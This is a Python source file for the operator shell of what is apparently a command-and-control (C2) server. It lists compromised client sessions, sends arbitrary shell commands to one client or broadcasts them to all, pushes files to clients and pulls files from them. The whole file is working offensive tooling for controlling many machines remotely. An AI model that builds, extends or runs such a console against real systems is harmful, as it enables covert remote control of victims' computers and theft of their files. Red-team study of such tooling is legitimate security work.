from .sessions import list_sessions, close_all_sessions

def server_shell(base_dir, db_hooks, shutdown_event=None):
    """Main server shell."""
    from .command_dispatch import send_command_to_client, broadcast_command
    from .file_transfers import broadcast_sendfile

    print("\nType 'help' for commands\n")
    
    while True:
        if shutdown_event and shutdown_event.is_set():
            break
            
        try:
            cmd = input("C2> ").strip()
            
            if cmd == "sessions":
                list_sessions()
            
            elif cmd.startswith("interact "):
                try:
                    cid = int(cmd.split()[1])
                    print(f"[*] Interacting with ID {cid}")
                    
                    while True:
                        if shutdown_event and shutdown_event.is_set():
                            break
                        sub_cmd = input(f"C2[{cid}]> ").strip()
                        if sub_cmd == "background":
                            break
                        if sub_cmd:
                            send_command_to_client(cid, sub_cmd, base_dir, db_hooks)
                except:
                    print("[!] Usage: interact <id>")
            
            elif cmd == "broadcastfile":
                broadcast_sendfile(base_dir, db_hooks["record_transfer"])
            
            elif cmd.startswith("broadcast "):
                broadcast_command(cmd[10:])
            
            elif cmd == "help":
                print(
                    "\n[*] Available Commands:\n\n"
                    " GLOBAL COMMANDS:\n"
                    "  sessions                     - List all active client sessions\n"
                    "  interact <id>                - Interact with a specific client\n"
                    "  broadcast <command>          - Send a command to ALL clients\n"
                    "  broadcastfile                - Send a file to ALL clients\n"
                    "  help                         - Show this help menu\n"
                    "  exit                         - Shut down the server\n\n"
                    " INTERACT MODE COMMANDS (after `interact <id>`):\n"
                    "  sendfile                     - Send a file to the selected client\n"
                    "  pull <path>                  - Pull a file from the client\n"
                    "  background                   - Return to main shell\n"
                    "  <any shell command>          - Execute on client system\n"
                )
            
            elif cmd == "exit":
                print("[!] Shutting down")
                if shutdown_event:
                    shutdown_event.set()
                close_all_sessions()
                break
            
            else:
                print("[!] Unknown command")
        
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
        except EOFError:
            print("\n[!] Exiting")
            break
        except Exception as e:
            if shutdown_event and shutdown_event.is_set():
                break
            print(f"[!] Error: {e}")